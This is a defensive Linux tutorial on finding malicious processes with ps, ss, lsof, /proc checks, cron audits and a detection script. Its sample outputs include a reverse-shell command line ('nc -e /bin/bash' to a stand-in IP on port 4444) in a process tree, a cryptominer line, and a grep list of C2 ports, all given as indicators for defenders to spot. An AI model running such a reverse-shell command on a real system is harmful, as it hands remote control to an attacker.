# Challenge 81: Detect Suspicious Processes in Linux

![Bash](https://img.shields.io/badge/Shell-Bash-4EAA25?style=flat&logo=gnu-bash&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red)
**eknatha**


## 📌 Overview

**Suspicious process detection** is a critical security skill. Malware, cryptominers, reverse shells, and unauthorized services often disguise themselves as normal processes — or run under hidden or misleading names. Knowing how to identify unexpected processes is essential for both **incident response** and **routine security auditing**.

Suspicious processes often show these signs:
- Unexpectedly high CPU or memory usage
- Running as root with no clear purpose
- Unusual network connections
- Running from `/tmp`, `/dev/shm`, or other non-standard locations
- Process names that mimic legitimate tools (e.g., `kworkerr` instead of `kworker`)
- No corresponding package or binary on disk

---

## 🧩 Task

Find unknown or suspicious processes consuming resources on the system.

---


<details>
<summary>💡 Click to view solution</summary>

## ✅ Solution

```bash
# Sorted by CPU usage — high consumers stand out
ps aux --sort=-%cpu

# Interactive real-time view
top
```

### How it works

| Command | Description |
|---------|-------------|
| `ps aux` | List **all** processes with full detail (all users, user format, without terminal) |
| `--sort=-%cpu` | Sort by CPU usage **descending** — highest first |
| `top` | Interactive real-time process monitor |

---

## 🔍 What Makes a Process Suspicious?

```
Signs of a suspicious process:
─────────────────────────────────────────────────────────
🔴  High CPU with no recognizable name
🔴  Process running from /tmp, /dev/shm, /var/tmp
🔴  Process name with extra characters (kworkerr, sshdd)
🔴  Established network connection to unknown external IP
🔴  Running as root with no clear function
🔴  Binary that has been deleted but process still runs
🔴  No corresponding entry in /usr/bin, /usr/sbin, or packages
🔴  Process spawned by an unusual parent (e.g., child of bash/cron)
🔴  Recent creation time that aligns with a suspicious event
```

---

## 📖 Extended Examples

### Example 1 — Sort All Processes by CPU

```bash
ps aux --sort=-%cpu
```

```bash
USER       PID  %CPU  %MEM    VSZ   RSS  TTY   STAT  START   TIME  COMMAND
root      9821  98.2   1.4  22000  5800  ?     R     10:00  45:12  ./xmrig --donate-level 0
nobody    4312  14.3   0.8  12000  3200  ?     S     09:55   5:21  /tmp/.hidden/svc
www-data  5201   2.1   0.2  45000  2100  ?     S     08:00   0:45  nginx: worker process
```

> ⚠️ `xmrig` is a known cryptominer. A process running from `/tmp/.hidden/` is a major red flag.

---

### Example 2 — Sort by Memory Usage

```bash
ps aux --sort=-%mem | head -15
```

---

### Example 3 — Show Full Command Line for All Processes

```bash
# Show full command line (not truncated)
ps auxww

# Show full command with environment
ps auxwwe

# Show only PID, user, CPU, memory, and full command
ps -eo pid,user,%cpu,%mem,cmd --sort=-%cpu | head -20
```

> 💡 `ps aux` often **truncates long command lines**. Use `ps auxww` to see the full command — crucial for identifying processes that disguise themselves with short fake names.

---

### Example 4 — Find Processes Running from Suspicious Locations

```bash
# Processes running from /tmp
ps aux | awk '$11 ~ /\/tmp/ {print}'

# Processes running from /dev/shm (memory filesystem — red flag)
ps aux | awk '$11 ~ /\/dev\/shm/ {print}'

# Processes running from hidden directories (names starting with .)
ps aux | awk '$11 ~ /\/\./ {print}'

# Processes running from /var/tmp
ps aux | awk '$11 ~ /\/var\/tmp/ {print}'
```

```bash
# If any output appears, investigate immediately:
nobody  4312  14.3  0.8  ...  /tmp/.hidden/svc -c2 pool.example.com
```

---

### Example 5 — Find Processes with Deleted Binaries

A common technique to hide malware — the binary is deleted after launch, so it cannot be found on disk, but the process keeps running.

```bash
# Find processes whose executable has been deleted
ls -la /proc/*/exe 2>/dev/null | grep deleted

# Or using ps
ps aux | awk '{print $2}' | while read pid; do
  exe=$(readlink /proc/$pid/exe 2>/dev/null)
  if echo "$exe" | grep -q "(deleted)"; then
    echo "PID $pid — DELETED binary: $exe"
    ps -p $pid -o pid,user,cmd --no-headers
  fi
done
```

```bash
# Example output:
PID 4312 — DELETED binary: /tmp/.svc (deleted)
 4312 nobody   /tmp/.svc
```

---

### Example 6 — Check for Unusual Network Connections

```bash
# Show all established connections with process info
sudo ss -tlnp
sudo ss -tnp state established

# Show all processes with their network connections
sudo netstat -tulnp   # If netstat is available

# Find processes connected to external IPs
sudo ss -tnp state established | grep -v "127.0.0.1\|::1\|192.168\|10\."
```

```bash
# Suspicious output — unknown process connected to external IP:
ESTAB  0  0  192.168.1.5:49321  203.0.113.99:4444  users:(("svc",pid=4312,fd=3))
#                                ^^^^^^^^^^^^^ ^^^^
#                                Unknown IP   Port 4444 = common reverse shell port
```

---

### Example 7 — Find Processes by Port 4444, 1337, or Other Common Attack Ports

```bash
# Check for processes on common malware/C2 ports
sudo ss -tlnp | grep -E ':4444|:1337|:31337|:8080|:9999|:6667'

# List all listening ports with their processes
sudo ss -tlnp
```

| Port | Common Use by Attackers |
|------|------------------------|
| `4444` | Default Metasploit reverse shell |
| `1337` | Common backdoor port |
| `31337` | Historical elite/l33t hacker port |
| `6667` | IRC — botnet C2 channel |
| `9999` | Common backdoor |
| `8443` | Alt HTTPS — often used for C2 |

---

### Example 8 — Check Process Parent Chain (PPID)

Unexpected parent-child relationships often reveal malicious processes:

```bash
# Show process tree
pstree -p

# Show process tree for a specific process
pstree -p 4312

# Find processes with unexpected parents
ps -eo pid,ppid,user,cmd | awk '{print $2, $1, $3, $4}' | sort -n
```

```bash
# Normal: nginx worker spawned by nginx master
1234 (nginx) → 5201 (nginx: worker)

# Suspicious: shell spawned by web server (possible RCE)
5201 (nginx) → 8821 (bash) → 9001 (nc -e /bin/bash 203.0.113.99 4444)
#                             ^^^^ reverse shell!
```

---

### Example 9 — Identify Unknown Processes by Binary Verification

```bash
# For a suspicious process, find its binary path
ls -la /proc/<PID>/exe

# Check if the binary is part of a known package (Debian/Ubuntu)
dpkg -S /usr/bin/suspicious_binary

# Check if the binary is part of a known package (RHEL/CentOS)
rpm -qf /usr/bin/suspicious_binary

# Verify the binary hash against VirusTotal or known-good hashes
md5sum /proc/<PID>/exe
sha256sum /proc/<PID>/exe
```

```bash
# If dpkg or rpm returns "not found" — binary is not from any installed package:
dpkg: /tmp/.svc not found.
# → Strong indicator of unauthorized software
```

---

### Example 10 — Check for Crontab and Persistence Mechanisms

Malware often installs persistence via cron:

```bash
# Check all user crontabs
for user in $(cut -f1 -d: /etc/passwd); do
  crontab -l -u "$user" 2>/dev/null | grep -v "^#" | grep -v "^$" | \
  awk -v u="$user" '{print u": "$0}'
done

# Check system-wide cron directories
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
cat /etc/crontab

# Check for recently modified cron files
find /etc/cron* /var/spool/cron -newer /etc/passwd -ls 2>/dev/null
```

---

### Example 11 — Audit Recently Created Executables

```bash
# Find executables created or modified in the last 7 days
find / -type f -executable -newer /etc/passwd -ls 2>/dev/null | grep -v proc

# Find recently created files in world-writable directories
find /tmp /var/tmp /dev/shm -type f -newer /etc/passwd -ls 2>/dev/null

# Find SUID/SGID files (can be used for privilege escalation)
find / -perm /4000 -o -perm /2000 2>/dev/null | grep -v "^/proc"
```

---

### Example 12 — Use `lsof` to Investigate a Suspicious PID

```bash
PID=4312

# What files does it have open?
sudo lsof -p $PID

# What network connections does it have?
sudo lsof -p $PID -i

# What is its full command line?
cat /proc/$PID/cmdline | tr '\0' ' '

# What environment variables does it have?
cat /proc/$PID/environ | tr '\0' '\n'

# What does its /proc directory reveal?
ls -la /proc/$PID/
cat /proc/$PID/status
cat /proc/$PID/maps | head -20   # Memory map — shows loaded libraries
```

---

### Example 13 — Full Suspicious Process Detection Script

```bash
#!/bin/bash

echo "============================================"
echo " Suspicious Process Detection Report"
echo " $(date)"
echo "============================================"

echo -e "\n[1] Top CPU Consumers]"
ps -eo pid,user,%cpu,cmd --sort=-%cpu | head -15

echo -e "\n[2] Processes Running from Suspicious Paths]"
ps aux | awk '
  $11 ~ /\/tmp/ || $11 ~ /\/dev\/shm/ || $11 ~ /\/var\/tmp/ || $11 ~ /\/\./ {
    print "⚠️  PID="$2, "USER="$1, "CMD="$11
  }'

echo -e "\n[3] Processes with Deleted Executables]"
for pid in /proc/[0-9]*/exe; do
  target=$(readlink "$pid" 2>/dev/null)
  if echo "$target" | grep -q "(deleted)"; then
    p=$(echo "$pid" | grep -o '[0-9]*')
    echo "⚠️  PID=$p — $target"
    ps -p $p -o pid,user,cmd --no-headers 2>/dev/null
  fi
done

echo -e "\n[4] Unusual Outbound Connections (non-RFC1918)]"
sudo ss -tnp state established 2>/dev/null | \
  grep -v "127\.\|192\.168\.\|10\.\|172\.1[6-9]\.\|172\.2[0-9]\.\|172\.3[0-1]\."

echo -e "\n[5] Listening on Unusual Ports]"
sudo ss -tlnp | grep -vE ':22|:80|:443|:25|:3306|:5432|:53|:123'

echo -e "\n[6] Recently Modified Executables in /tmp and /dev/shm]"
find /tmp /dev/shm /var/tmp -type f -newer /etc/passwd -ls 2>/dev/null

echo -e "\n[7] Unexpected SUID Binaries]"
find /tmp /dev/shm /home /var -perm /4000 2>/dev/null | grep -v "^/proc"

echo "============================================"
echo " Review all ⚠️  warnings carefully"
echo "============================================"
```

---

## 🗂️ Indicators of Compromise (IoC) — Quick Reference

| Indicator | Command to Check |
|-----------|-----------------|
| High CPU from unknown process | `ps aux --sort=-%cpu | head` |
| Process running from `/tmp` | `ps aux \| awk '$11 ~ /\/tmp/'` |
| Deleted binary still running | `ls -la /proc/*/exe 2>/dev/null \| grep deleted` |
| Reverse shell connection | `ss -tnp \| grep -v 127.0.0.1 \| grep ESTAB` |
| Listening on port 4444/1337 | `ss -tlnp \| grep ':4444\|:1337'` |
| Malicious cron job | `for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u; done` |
| Unknown SUID binary | `find / -perm /4000 2>/dev/null \| grep -v proc` |
| Modified system binary | `rpm -Va` (RHEL) or `debsums -c` (Debian) |
| Unusual parent process | `pstree -p \| grep bash` |

---

## 🛠️ Process Investigation Tools — Summary

| Tool | Purpose |
|------|---------|
| `ps aux --sort=-%cpu` | Ranked process list — high CPU stands out |
| `top` / `htop` | Real-time interactive monitoring |
| `lsof -p PID` | Open files and network connections for a process |
| `ss -tnp` | Network connections with process info |
| `pstree -p` | Visual parent-child process hierarchy |
| `/proc/PID/` | Raw process details: cmdline, environ, maps, exe |
| `find /tmp -newer` | Recently created suspicious files |
| `rpm -Va` / `debsums` | Verify installed package file integrity |
| `strace -p PID` | Trace what syscalls the process is making |

---

## 🚀 Full Workflow — Investigate a Suspicious Process

```bash
# Step 1: Identify the suspicious process
ps aux --sort=-%cpu | head -10

# Step 2: Note the PID and gather basic info
PID=4312
ps -p $PID -o pid,ppid,user,stat,cmd

# Step 3: Find the binary and check if it's deleted
ls -la /proc/$PID/exe
cat /proc/$PID/cmdline | tr '\0' ' '

# Step 4: Check its network connections
sudo lsof -p $PID -i
sudo ss -tnp | grep $PID

# Step 5: Check what files it has open
sudo lsof -p $PID | head -20

# Step 6: Check its parent process
ps -p $(cat /proc/$PID/status | grep PPid | awk '{print $2}') -o pid,user,cmd

# Step 7: Verify binary against package manager
ls -la /proc/$PID/exe
rpm -qf $(readlink /proc/$PID/exe 2>/dev/null) 2>/dev/null || echo "NOT IN ANY PACKAGE"

# Step 8: If malicious — kill and investigate how it got there
kill -SIGKILL $PID

# Step 9: Check for persistence mechanisms
crontab -l; ls /etc/cron.d/; ls /etc/rc.d/

# Step 10: Preserve evidence before cleanup
cp /proc/$PID/exe /tmp/evidence_$(date +%s) 2>/dev/null
sudo ss -tnp > /tmp/network_state_$(date +%s).txt
sudo ps auxww > /tmp/process_state_$(date +%s).txt
```

---

## ⚠️ Common Pitfalls

| Pitfall | Fix |
|---------|-----|
| Killing a suspicious process before preserving evidence | Always capture `/proc/PID/exe`, network state, and process list first |
| Assuming high CPU = malicious | Legitimate processes (compilers, video encoding, backups) also spike CPU |
| Missing short-lived processes | Malware may run briefly — check cron, systemd timers, and bash history |
| `ps aux` truncates command line | Use `ps auxww` or `cat /proc/PID/cmdline` for full command |
| Checking only running processes | Malware may use cron or systemd — check persistence mechanisms too |
| Rebooting without evidence | Volatile data (memory, connections, process list) is lost on reboot |

---

## 🔑 Key Takeaways

- `ps aux --sort=-%cpu` immediately surfaces high-CPU outliers — the first step in spotting anomalies.
- **Location matters** — any process running from `/tmp`, `/dev/shm`, or hidden directories is immediately suspicious.
- **Deleted binaries that still run** are a classic malware technique — always check `/proc/*/exe` for `(deleted)`.
- **Unusual network connections** (outbound to unknown IPs, listening on odd ports) are one of the strongest indicators.
- Always **preserve evidence** before killing a suspicious process — copy the binary, capture network state, save process list.
- Verify suspicious binaries against the package manager (`rpm -qf` / `dpkg -S`) — legitimate software is almost always in a package.
- Check **persistence mechanisms** (cron, systemd timers, rc.d) — killing the process is useless if it respawns automatically.

---

## 📚 Related Concepts

- [Challenge 67 — Monitor Authentication Logs]
- [Challenge 69 — Identify Zombie Processes]
- [Challenge 71 — Diagnose High CPU Usage]
- [Challenge 77 — Analyze System Calls]
- [rkhunter](https://rkhunter.sourceforge.net/) — rootkit hunter and system integrity checker
- [chkrootkit](http://www.chkrootkit.org/) — checks for signs of rootkits
- [AIDE](https://aide.github.io/) — Advanced Intrusion Detection Environment — file integrity monitoring


</details>
